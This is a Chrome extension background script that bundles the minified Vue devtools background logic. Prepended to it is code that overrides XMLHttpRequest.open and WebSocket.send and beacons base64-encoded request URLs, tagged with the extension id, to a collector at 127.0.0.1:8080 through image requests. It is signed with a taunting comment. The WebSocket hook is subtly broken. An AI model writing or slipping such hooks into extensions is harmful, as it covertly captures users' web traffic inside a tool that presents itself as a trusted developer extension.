function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function(e){var n={};function o(t){if(n[t])return n[t].exports;var s=n[t]={i:t,l:!1,exports:{}};return e[t].call(s.exports,s,s.exports,o),s.l=!0,s.exports}o.m=e,o.c=n,o.d=function(e,n,t){o.o(e,n)||Object.defineProperty(e,n,{configurable:!1,enumerable:!0,get:t})},o.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return o.d(n,"a",n),n},o.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},o.p="",o(o.s=176)}({176:function(e,n){const o={};let t;function s(){o[t]?chrome.contextMenus.create({id:"vue-inspect-instance",title:"Inspect Vue component",contexts:["all"]}):chrome.contextMenus.remove("vue-inspect-instance")}chrome.runtime.onConnect.addListener(e=>{let n,t;!function(e){return+e+""===e}(e.name)?(n=e.sender.tab.id,t="backend"):(n=e.name,t="devtools",function(e){chrome.tabs.executeScript(e,{file:"/build/proxy.js"},function(n){n?console.log("injected proxy to tab "+e):o[e].devtools.postMessage("proxy-fail")})}(+e.name)),o[n]||(o[n]={devtools:null,backend:null}),o[n][t]=e,o[n].devtools&&o[n].backend&&function(e,n,t){function c(n){if("log"===n.event)return console.log("tab "+e,n.payload);console.log("devtools -> backend",n),t.postMessage(n)}function r(o){if("log"===o.event)return console.log("tab "+e,o.payload);console.log("backend -> devtools",o),n.postMessage(o)}function a(){console.log("tab "+e+" disconnected."),n.onMessage.removeListener(c),t.onMessage.removeListener(r),n.disconnect(),t.disconnect(),o[e]=null,s()}n.onMessage.addListener(c),t.onMessage.addListener(r),n.onDisconnect.addListener(a),t.onDisconnect.addListener(a),console.log("tab "+e+" connected."),s()}(n,o[n].devtools,o[n].backend)}),chrome.runtime.onMessage.addListener((e,n)=>{if(n.tab&&e.vueDetected){const o=e.nuxtDetected?".nuxt":"";chrome.browserAction.setIcon({tabId:n.tab.id,path:{16:`icons/16${o}.png`,48:`icons/48${o}.png`,128:`icons/128${o}.png`}}),chrome.browserAction.setPopup({tabId:n.tab.id,popup:e.devtoolsEnabled?`popups/enabled${o}.html`:`popups/disabled${o}.html`})}}),chrome.tabs.onActivated.addListener(({tabId:e})=>{t=e,s()}),chrome.contextMenus.onClicked.addListener((e,n)=>{chrome.runtime.sendMessage({vueContextMenu:{id:e.menuItemId}})})}});